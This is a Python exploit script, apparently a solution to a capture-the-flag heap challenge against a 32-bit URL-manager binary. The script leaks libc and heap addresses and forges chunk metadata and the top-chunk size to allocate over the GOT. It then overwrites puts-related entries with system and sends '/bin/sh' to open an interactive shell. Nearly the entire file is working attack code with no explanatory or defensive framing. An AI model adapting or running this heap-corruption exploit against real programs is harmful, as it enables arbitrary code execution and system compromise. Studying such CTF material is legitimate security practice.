#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './nonamestill-12cba55e15194011f39b2dd380797669d84322489db6ee35c0a53f8208a1c9d4.dms'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
if not args['ASLR']:
    context.aslr = False
mode = args['MODE'].lower()
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = os.path.abspath(libc)
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
info('libc: %s', libc)
libc = ELF(libc)


def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('0', 4000)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def create_url(data='', length=None):
        io.sendlineafter('> ', 1)
        if length is None:
            length = len(data) + 1
        io.sendline(length)
        if data:
            if len(data) + 1 < length:
                io.sendline(data)
            else:
                io.send(data)

    def decode_url(idx):
        io.sendlineafter('> ', 2)
        io.sendline(idx)

    def list_urls():
        io.sendlineafter('> ', 3)

    def delete_url(idx):
        io.sendlineafter('> ', 4)
        io.sendline(idx)

    for i in xrange(4):
        create_url(cyclic(0x80))
    delete_url(3)
    delete_url(1)
    create_url(length=0)
    create_url(length=0)
    list_urls()
    io.recvuntil('0: ')
    libc.address = u32(io.recv(4)) - libc.symbols['__malloc_hook'] - 0x48
    info('libc base address: %#x', libc.address)
    io.recvuntil('1: ')
    heap_base = u32(io.recv(4)) - 0x1128
    info('heap base address: %#x', heap_base)
    for i in xrange(4):
        delete_url(0)

    # utilize merge in free to generate a free chunk overlap with top chunk
    create_url(fit({6: '%'}), length=0x80)
    delete_url(0)
    create_url(length=0)
    create_url(fit({
        0: heap_base + 0x1068,
        0x48: 0x50d1,
        0x4c: 0x804d024 - 0xc,
        0x50: 0x804d024 - 0x8,
        0x54: 0,
        0x58: 0,
    }), length=0x5100)
    decode_url(1)
    create_url(fit({0xc: 0x50d0, 0x10: 0x10}), length=0x80)
    delete_url(1)
    delete_url(0)

    # fake the size of top chunk to malloc on GOT
    create_url('A', length=0x50f0)
    create_url(fit({0x8: 0xffffff01}))
    gap_size = elf.got['puts'] - (heap_base + 0x6120) - 0x8
    info('gap size: %d', gap_size)
    create_url(length=gap_size)
    create_url(flat([
        libc.symbols['strchr'],
        libc.symbols['__libc_start_main'],
        libc.symbols['system'],
    ]))
    io.sendline('/bin/sh')

    io.clean()
    io.interactive()


if __name__ == '__main__':
    exploit()
